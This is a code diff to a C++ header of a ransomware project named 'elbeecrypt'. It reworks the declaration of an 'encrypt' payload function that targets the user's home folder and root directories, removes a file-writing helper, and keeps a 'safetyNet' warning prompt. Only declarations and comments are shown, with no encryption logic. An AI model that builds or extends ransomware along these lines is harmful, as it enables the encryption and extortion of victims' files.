@@ -4,7 +4,6 @@
 #include <string>
 #include <tuple>
 #include <vector>
-
 #include "elbeecrypt/common/io/cryptor-engine.hpp"
 
 namespace fs = std::filesystem;
@@ -34,6 +33,16 @@ namespace elbeecrypt::cryptor::Main {
 	);
 
 	/**
+	 * @brief Runs the encryption payload of the ransomware.
+	 * 
+	 * @param homeFolder The user's home folder
+	 * @param roots The list of root directories to target
+	 * @param cryptorEngine The cryptor engine instance to use
+	 * @return A list of the files that were successfully encrypted
+	 */
+	std::vector<fs::path> encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots, elbeecrypt::common::io::CryptorEngine& cryptorEngine);
+
+	/**
 	 * @brief Prompts the user warning them of potential system damage.
 	 * Serves as a safety net in case the user accidentally launched the
 	 * program on their system.
@@ -41,21 +50,4 @@ namespace elbeecrypt::cryptor::Main {
 	 * @return Whether the application is allowed to move forward
 	 */
 	bool safetyNet();
-
-	/**
-	 * @brief Runs the encryption payload of the ransomware.
-	 * 
-	 * @param homeFolder The user's home folder
-	 * @param roots The list of root directories to target
-	 * @return A list of the files that were successfully encrypted and the cryptor engine instance that was used
-	 */
-	std::tuple<std::vector<fs::path>, elbeecrypt::common::io::CryptorEngine> encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots);
-
-	/**
-	 * @brief Writes a line to a file.
-	 * 
-	 * @param target The path to the file
-	 * @param content The content to write to the file
-	 */
-	void writeToFile(const fs::path& target, std::string content);
 }
